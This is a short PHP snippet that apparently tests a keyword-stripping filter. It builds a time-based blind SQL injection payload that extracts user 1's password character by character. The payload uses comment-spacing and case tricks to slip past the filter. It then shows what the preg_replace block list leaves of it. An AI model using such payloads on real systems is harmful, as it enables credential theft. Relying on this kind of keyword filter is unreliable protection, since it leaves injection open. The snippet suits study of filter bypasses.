<?php 
$username="admin'/**/AND/**/IF(SUBSTRING((SELECT/**/passwoRd/**/FROM/**/users/**/WHERE/**/user_id=1),{i},1)='{c}',SLEEP(3),1)--";
echo $username. "\n";
$username=preg_replace('/join|group|sleep|having|or|select|from|where|\ /', '',$username);
echo $username
?>